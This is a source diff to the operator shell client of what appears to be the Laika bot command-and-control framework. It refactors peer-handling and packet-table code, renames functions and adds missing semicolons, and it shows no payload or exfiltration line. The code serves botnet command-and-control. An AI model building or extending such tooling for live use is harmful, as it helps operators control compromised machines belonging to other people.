@@ -12,14 +12,14 @@ typedef struct sShell_hashMapElem {
     uint8_t *pub;
 } tShell_hashMapElem;
 
-int shellElemCompare(const void *a, const void *b, void *udata) {
+int shell_ElemCompare(const void *a, const void *b, void *udata) {
     const tShell_hashMapElem *ua = a;
     const tShell_hashMapElem *ub = b;
 
     return memcmp(ua->pub, ub->pub, crypto_kx_PUBLICKEYBYTES); 
 }
 
-uint64_t shellElemHash(const void *item, uint64_t seed0, uint64_t seed1) {
+uint64_t shell_ElemHash(const void *item, uint64_t seed0, uint64_t seed1) {
     const tShell_hashMapElem *u = item;
     return *(uint64_t*)(u->pub); /* hashes pub key (first 8 bytes) */
 }
@@ -47,7 +47,7 @@ void shellC_handleAddPeer(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uDat
     type = laikaS_readByte(&peer->sock);
 
     /* ignore panel clients */
-    if (type == PEER_PANEL)
+    if (type == PEER_AUTH)
         return;
 
     /* create peer */
@@ -69,26 +69,29 @@ void shellC_handleRmvPeer(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uDat
     type = laikaS_readByte(&peer->sock);
 
     /* ignore panel clients */
-    if (type == PEER_PANEL)
+    if (type == PEER_AUTH)
         return;
 
     if ((bot = shellC_getPeerByPub(client, pubKey, &id)) == NULL)
-        LAIKA_ERROR("LAIKAPKT_AUTHENTICATED_RMV_PEER_RES: Unknown peer!\n")
+        LAIKA_ERROR("LAIKAPKT_AUTHENTICATED_RMV_PEER_RES: Unknown peer!\n");
 
     /* remove peer */
     shellC_rmvPeer(client, bot, id);
 }
 
-LAIKAPKT_SIZE shellC_pktSizeTbl[LAIKAPKT_MAXNONE] = {
-    [LAIKAPKT_HANDSHAKE_RES] = sizeof(uint8_t),
-    [LAIKAPKT_AUTHENTICATED_ADD_PEER_RES] = crypto_kx_PUBLICKEYBYTES + sizeof(uint8_t) + LAIKA_HOSTNAME_LEN + LAIKA_IPV4_LEN, /* pubkey + peerType + host + ip */
-    [LAIKAPKT_AUTHENTICATED_RMV_PEER_RES] = crypto_kx_PUBLICKEYBYTES + sizeof(uint8_t), /* pubkey + peerType */
-};
-
-PeerPktHandler shellC_handlerTbl[LAIKAPKT_MAXNONE] = {
-    [LAIKAPKT_HANDSHAKE_RES] = shellC_handleHandshakeRes,
-    [LAIKAPKT_AUTHENTICATED_ADD_PEER_RES] = shellC_handleAddPeer,
-    [LAIKAPKT_AUTHENTICATED_RMV_PEER_RES] = shellC_handleRmvPeer,
+struct sLaika_peerPacketInfo shellC_pktTbl[LAIKAPKT_MAXNONE] = {
+    LAIKA_CREATE_PACKET_INFO(LAIKAPKT_HANDSHAKE_RES,
+        shellC_handleHandshakeRes,
+        sizeof(uint8_t),
+    false),
+    LAIKA_CREATE_PACKET_INFO(LAIKAPKT_AUTHENTICATED_ADD_PEER_RES,
+        shellC_handleAddPeer,
+        crypto_kx_PUBLICKEYBYTES + LAIKA_HOSTNAME_LEN + LAIKA_IPV4_LEN + sizeof(uint8_t),
+    false),
+    LAIKA_CREATE_PACKET_INFO(LAIKAPKT_AUTHENTICATED_RMV_PEER_RES,
+        shellC_handleRmvPeer,
+        crypto_kx_PUBLICKEYBYTES + sizeof(uint8_t),
+    false),
 };
 
 void shellC_init(tShell_client *client) {
@@ -96,13 +99,12 @@ void shellC_init(tShell_client *client) {
 
     laikaP_initPList(&client->pList);
     client->peer = laikaS_newPeer(
-        shellC_handlerTbl,
-        shellC_pktSizeTbl,
+        shellC_pktTbl,
         &client->pList,
         (void*)client
     );
 
-    client->peers = hashmap_new(sizeof(tShell_hashMapElem), 8, 0, 0, shellElemHash, shellElemCompare, NULL, NULL);
+    client->peers = hashmap_new(sizeof(tShell_hashMapElem), 8, 0, 0, shell_ElemHash, shell_ElemCompare, NULL, NULL);
     client->peerTbl = NULL;
     client->peerTblCap = 4;
     client->peerTblCount = 0;
@@ -150,7 +152,7 @@ void shellC_connectToCNC(tShell_client *client, char *ip, char *port) {
 
     /* create encryption keys */
     if (crypto_kx_client_session_keys(client->peer->inKey, client->peer->outKey, client->pub, client->priv, client->peer->peerPub) != 0)
-        LAIKA_ERROR("failed to gen session key!\n")
+        LAIKA_ERROR("failed to gen session key!\n");
 
     /* setup socket */
     laikaS_connect(sock, ip, port);
@@ -172,7 +174,7 @@ void shellC_connectToCNC(tShell_client *client, char *ip, char *port) {
 
     /* queue authenticated handshake request */
     laikaS_startOutPacket(client->peer, LAIKAPKT_AUTHENTICATED_HANDSHAKE_REQ);
-    laikaS_writeByte(sock, PEER_PANEL);
+    laikaS_writeByte(sock, PEER_AUTH);
     laikaS_endOutPacket(client->peer);
 
     /* the handshake requests will be sent on the next call to shellC_poll */
